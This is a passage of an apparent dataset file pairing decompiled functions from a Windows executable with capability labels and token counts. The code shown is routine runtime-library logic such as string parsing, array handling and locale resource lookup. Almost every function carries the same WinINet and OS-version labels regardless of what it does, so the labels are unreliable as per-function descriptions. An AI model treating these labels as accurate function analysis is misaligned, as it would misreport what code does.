            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403c70(uint param_1, uint param_2)\n\n{\n    uint uStack16;\n    uint uStack8;\n    \n    if (1 < *0x48302c) {\n        uStack16 = 0x403c81;\n        uStack8 = param_2;\n        fcn.00403c50();\n        (**0x485014)(0xeedfae1, 0, 1, &stack0xfffffff0);\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00403c98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403c98(uint param_1, uint param_2)\n\n{\n    uint uStack4;\n    \n    if (1 < *0x48302c) {\n        uStack4 = param_2;\n        (**0x485014)(0xeedfae2, 0, 1, &uStack4);\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00403cb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00403cb4(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = param_2;\n    uStack4 = in_EAX;\n    if (1 < *0x48302c) {\n        (**0x485014)(0xeedfae3, 0, 2, &uStack8);\n    }\n    return CONCAT44(uStack8, uStack4);\n}\n",
        "token_count": 112
    },
    "0040420c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040420c(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *0x485644;\n    puStack28 = &stack0xfffffffc;\n    if (*0x485640 != 0) {\n        iVar1 = *(*0x485640 + 4);\n        uStack32 = 0x404261;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack36;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x485644 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack36;\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "0040427c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040427c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    if (*0x485640 != NULL) {\n        iVar1 = **0x485640;\n        iVar4 = 0;\n        iVar2 = (*0x485640)[1];\n        uStack32 = 0x4042d1;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack36;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x485644 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack36;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00404444": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00404444(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x48504c != '\\0') {\n        if ((*0x485220 == -0x284e) && (*0x485228 != 0)) {\n            uStack8 = 0x40446d;\n            (**0x485238)();\n        }\n        puStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        uStack16 = 0x1e;\n        uStack20 = 0x483070;\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x404482;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x4044cc, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x483034 == '\\0') {\n        uStack8 = 0;\n        puStack12 = 0x483068;\n        uStack16 = 0x483070;\n        uStack20 = 0;\n        uStack24 = 0x4044c1;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "004044d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004044d0(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x485660 == 0) && (*0x485048 != NULL)) {\n        do {\n            pcVar1 = *0x485048;\n            *0x485048 = NULL;\n            (*pcVar1)();\n        } while (*0x485048 != NULL);\n    }\n    if (*0x483004 != 0) {\n        fcn.004043b8();\n        fcn.00404444();\n        *0x483004 = 0;\n    }\n    do {\n        if ((*0x485660 == 2) && (*0x483000 == 0)) {\n            *0x485644 = 0;\n        }\n        fcn.0040420c();\n        if (((*0x485660 < 2) || (*0x483000 != 0)) && (*0x485648 != 0)) {\n            fcn.00406214();\n            iVar2 = *(*0x485648 + 0x10);\n            if ((iVar2 != *(*0x485648 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.004041e4();\n        if (*0x485660 == 1) {\n            (**0x48565c)();\n        }\n        if (*0x485660 != 0) {\n            fcn.00404414();\n        }\n        if (*0x485638 == NULL) {\n            if (*0x485028 != NULL) {\n                (**0x485028)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x483000);\n        }\n        puVar3 = *0x485638;\n        puVar4 = 0x485638;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 496
    },
    "00404c14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404c14(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_2) {\n        iVar1 = *in_EAX;\n        if ((iVar1 != 0) && (*(iVar1 + -8) == 1)) {\n            fcn.00402b64();\n            *in_EAX = iVar1;\n            *(iVar1 + -4) = param_2;\n            *(param_2 + iVar1) = 0;\n            return;\n        }\n        iVar1 = fcn.0040468c();\n        if (*in_EAX != 0) {\n            fcn.00402d34();\n        }\n    }\n    fcn.004045c8();\n    *in_EAX = iVar1;\n    return;\n}\n",
        "token_count": 196
    },
    "00404ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ed0(uint arg_8h)\n\n{\n    fcn.00404e40();\n    fcn.00404dc0();\n    return;\n}\n",
        "token_count": 40
    },
    "00405068": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405068(void)\n\n{\n    if (*0x483010 != NULL) {\n        (**0x483010)();\n        return;\n    }\n    fcn.00402c94();\n    return;\n}\n",
        "token_count": 47
    },
    "00405080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402c68)\n\nvoid __fastcall fcn.00405080(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.004045c8();\n            }\n            else {\n                fcn.004045ec();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00404cd4();\n            }\n            else {\n                fcn.00404cec();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00405068();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00405080();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405034();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00406298();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x485008 != NULL) {\n                    (**0x485008)();\n                }\n                fcn.00402c3c();\n                return;\n            }\n            do {\n                fcn.00405b44();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 577
    },
    "00405178": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405178(void)\n\n{\n    if (*0x483018 != NULL) {\n        (**0x483018)();\n        return;\n    }\n    fcn.00402c94();\n    return;\n}\n",
        "token_count": 47
    },
    "0040553c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040553c(uint arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t extraout_EDX;\n    int32_t iVar3;\n    int64_t iVar4;\n    char cStack38;\n    uint var_21h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0x7fffffff < arg_ch;\n    iVar3 = 0;\n    do {\n        iVar2 = iVar3;\n        cVar1 = fcn.004054c0(10, 0);\n        if (extraout_EDX < 0) {\n            cVar1 = -cVar1;\n        }\n        *(&var_21h + iVar2) = cVar1 + '0';\n        iVar3 = iVar2 + 1;\n        iVar4 = fcn.00405444();\n    } while (iVar4 != 0);\n    if (var_1h != '\\0') {\n        *(&var_21h + iVar2 + 1) = 0x2d;\n        iVar3 = iVar2 + 2;\n    }\n    if (0xff < in_EAX) {\n        in_EAX = 0xff;\n    }\n    iVar2 = 1;\n    if (0 < in_EAX - iVar3) {\n        do {\n            *(in_EDX + iVar2) = 0x20;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 <= in_EAX - iVar3);\n    }\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        *(in_EDX + iVar2) = (&cStack38)[iVar3];\n        iVar2 = iVar2 + 1;\n    }\n    fcn.00402f3c();\n    return;\n}\n",
        "token_count": 446
    },
    "00405618": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405707)\n// WARNING: Removing unreachable block (ram,0x004057f5)\n// WARNING: Removing unreachable block (ram,0x004057fc)\n// WARNING: Removing unreachable block (ram,0x00405782)\n// WARNING: Removing unreachable block (ram,0x00405798)\n// WARNING: Removing unreachable block (ram,0x00405806)\n// WARNING: Removing unreachable block (ram,0x00405809)\n// WARNING: Removing unreachable block (ram,0x0040580f)\n// WARNING: Removing unreachable block (ram,0x0040578e)\n\nulong __fastcall fcn.00405618(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    int32_t *piStack36;\n    uint32_t uStack28;\n    int32_t iStack24;\n    \n    iVar7 = 1;\n    uStack28 = 0;\n    iStack24 = 0;\n    if (in_EAX == 0) {\n        *param_2 = 1;\n        goto code_r0x0040582a;\n    }\n    for (; *(in_EAX + -1 + iVar7) == ' '; iVar7 = iVar7 + 1) {\n    }\n    bVar9 = false;\n    cVar4 = *(in_EAX + -1 + iVar7);\n    if (cVar4 == '-') {\n        bVar9 = true;\n        iVar7 = iVar7 + 1;\n    }\n    else if (cVar4 == '+') {\n        iVar7 = iVar7 + 1;\n    }\n    uVar2 = 1;\n    piStack36 = param_2;\n    if (((*(in_EAX + -1 + iVar7) == '$') || (cVar4 = fcn.00402f40(),  cVar4 == 'X')) ||\n       ((*(in_EAX + -1 + iVar7) == '0' && (cVar4 = fcn.00402f40(),  cVar4 == 'X')))) {\n        if (*(in_EAX + -1 + iVar7) == '0') {\n            iVar7 = iVar7 + 1;\n        }\n        do {\n            iVar7 = iVar7 + 1;\n            uVar1 = *(in_EAX + -1 + iVar7);\n            if (uVar1 - 0x30 < 10) {\n                uVar8 = uVar1 - 0x30;\n            }\n            else if (uVar1 + 0xbf < 6) {\n                uVar8 = uVar1 - 0x37;\n            }\n            else {\n                if (5 < uVar1 + 0x9f) goto code_r0x00405739;\n                uVar8 = uVar1 - 0x57;\n            }\n            if (((iStack24 != 0) && (iStack24 < 0)) || ((iStack24 != 0xfffffff && (0xfffffff < iStack24))))\n            goto code_r0x00405739;\n            uVar3 = uStack28 >> 0x1c;\n            uVar5 = uStack28 * 0x10;\n            uStack28 = uVar5 + uVar8;\n            iStack24 = (iStack24 << 4 | uVar3) + (uVar8 >> 0x1f) + CARRY4(uVar5, uVar8);\n            uVar2 = 0;\n        } while( true );\n    }\n    for (; *(in_EAX + -1 + iVar7) - 0x30U < 10; iVar7 = iVar7 + 1) {\n        uVar2 = *(in_EAX + -1 + iVar7);\n        iVar6 = fcn.00405420();\n        piStack36 = (uVar2 - 0x30) + iVar6;\n        uVar2 = 0;\n    }\n    iStack24 = 0;\n    uStack28 = 0;\n    goto code_r0x00405810;\ncode_r0x00405739:\n    if (bVar9) {\n        bVar9 = uStack28 != 0;\n        uStack28 = -uStack28;\n        iStack24 = -(iStack24 + bVar9);\n    }\ncode_r0x00405810:\n    if (uVar2 | *(in_EAX + -1 + iVar7) != '\\0') {\n        *piStack36 = iVar7;\n    }\n    else {\n        *piStack36 = 0;\n    }\ncode_r0x0040582a:\n    return CONCAT44(iStack24, uStack28);\n}\n",
        "token_count": 1081
    },
    "0040586c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040586c(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t **in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_18h = *in_EAX;\n    iVar4 = *arg_8h;\n    if (iVar4 < 1) {\n        if (iVar4 < 0) {\n            fcn.00402c94();\n        }\n        fcn.00405864();\n    }\n    else {\n        var_10h = 0;\n        if (var_18h != NULL) {\n            var_10h = var_18h[-1];\n            var_18h = var_18h + -2;\n        }\n        iVar1 = in_EDX + *(in_EDX + 1);\n        iVar2 = *(iVar1 + 2);\n        piVar3 = *(iVar1 + 6);\n        if (piVar3 == NULL) {\n            var_8h = 0;\n        }\n        else {\n            var_8h = *piVar3;\n        }\n        if (iVar2 != (iVar4 * iVar2) / iVar4) {\n            fcn.00402c94();\n        }\n        if ((var_18h == NULL) || (*var_18h == 1)) {\n            if ((iVar4 < var_10h) && (var_8h != 0)) {\n                fcn.0040585c();\n            }\n            fcn.00402b64();\n        }\n        else {\n            *var_18h = *var_18h + -1;\n            var_18h = fcn.00402b14();\n            if (iVar4 < var_10h) {\n                var_10h = iVar4;\n            }\n            if (var_8h == 0) {\n                fcn.00402d34();\n            }\n            else {\n                fcn.004031a8();\n                fcn.0040584c(var_10h);\n            }\n        }\n        *var_18h = 1;\n        var_18h[1] = iVar4;\n        fcn.004031a8();\n        if ((1 < in_ECX) && (-1 < iVar4 + -1)) {\n            do {\n                fcn.0040586c(arg_8h + 1);\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        *in_EAX = var_18h + 2;\n    }\n    return;\n}\n",
        "token_count": 635
    },
    "00405a44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a44(uint *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = NULL;\n    if (in_EAX != 0) {\n        if (in_ECX < 0) {\n            arg_ch = arg_ch + in_ECX;\n            in_ECX = 0;\n        }\n        iVar1 = *(in_EAX + -4);\n        if (iVar1 < in_ECX) {\n            in_ECX = iVar1;\n        }\n        if (iVar1 - in_ECX < arg_ch) {\n            arg_ch = iVar1 - in_ECX;\n        }\n        if (arg_ch < 0) {\n            arg_ch = 0;\n        }\n        if (0 < arg_ch) {\n            piVar2 = *(in_EDX + *(in_EDX + 1) + 6);\n            if (piVar2 == NULL) {\n                var_ch = 0;\n            }\n            else {\n                var_ch = *piVar2;\n            }\n            var_10h = fcn.00402b14();\n            *var_10h = 1;\n            var_10h[1] = arg_ch;\n            var_10h = var_10h + 2;\n            if (0 < arg_ch) {\n                if (var_ch == 0) {\n                    fcn.00402d34();\n                }\n                else {\n                    fcn.004031a8();\n                    fcn.0040584c(arg_ch);\n                }\n            }\n        }\n    }\n    fcn.00405864();\n    *arg_8h = var_10h;\n    return;\n}\n",
        "token_count": 424
    },
    "00405bd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00405bd8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.00405e6c();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 154
    },
    "00405c20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00405c20(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piStack16;\n    \n    piStack16 = *0x483038;\n    if (*0x483038 != NULL) {\n        do {\n            if (((in_EAX == piStack16[1]) || (in_EAX == piStack16[2])) || (in_EAX == piStack16[3])) {\n                in_EAX = fcn.00405bd8();\n                break;\n            }\n            piStack16 = *piStack16;\n        } while (piStack16 != NULL);\n    }\n    return CONCAT44(piStack16, in_EAX);\n}\n",
        "token_count": 146
    },
    "00405c94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00405c94(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *puVar3;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    code *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    iVar1 = sub.kernel32.dll_GetModuleHandleA(0x405e48);\n    if (((iVar1 == 0) || (var_18h = sub.kernel32.dll_GetProcAddress(iVar1, 0x405e58),  var_18h == NULL)) ||\n       (iVar1 = (*var_18h)(lpString1, &lpFileName, 0x105),  iVar1 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            var_10h = fcn.00405c68();\n            if (*var_10h == '\\0') {\n                return var_ch;\n            }\n            var_10h = fcn.00405c68();\n            if (*var_10h == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            var_10h = lpString1 + 2;\n        }\n        iVar1 = var_10h - lpString1;\n        puVar3 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar3, lpString1, iVar1 + 1);\n        while (*var_10h != '\\0') {\n            var_14h = fcn.00405c68();\n            if (0x105 < var_14h + (iVar1 - var_10h) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar1, var_10h, var_14h + (1 - var_10h));\n            iVar2 = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (iVar2 == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(iVar2);\n            iVar2 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar2 + iVar1 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar1) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar1 + 1, &lpString2, 0x104 - iVar1);\n            puVar3 = &lpString2;\n            iVar2 = sub.kernel32.dll_lstrlenA();\n            iVar1 = iVar1 + iVar2 + 1;\n            var_10h = var_14h;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar3);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 867
    },
    "00405e6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00405e6c(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar3;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint *noname_17;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint *lpString1;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.00405e6c::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    noname_17 = &fcn.00405e6c::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x4060b0;\n    uVar3 = 0x80000001;\n    noname_12 = 0x405eaa;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.00405e6c::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x4060b0;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x405ec8;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.00405e6c::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x4060cc;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar3 = sub.kernel32.dll_GetThreadLocale(3, &fcn.00405e6c::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar3);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.00405e6c::lpLibFileName);\n                    for (lpString1 = &fcn.00405e6c::lpLibFileName + iVar2;\n                        (*lpString1 != '.' && (&fcn.00405e6c::lpLibFileName != lpString1)); lpString1 = lpString1 + -1)\n                    {\n                    }\n                    if (&fcn.00405e6c::lpLibFileName != lpString1) {\n                        lpString1 = lpString1 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (lpString1, &fcn.00405e6c::var_12h, \n                                       0x105 - (lpString1 - &fcn.00405e6c::lpLibFileName));\n                            iVar1 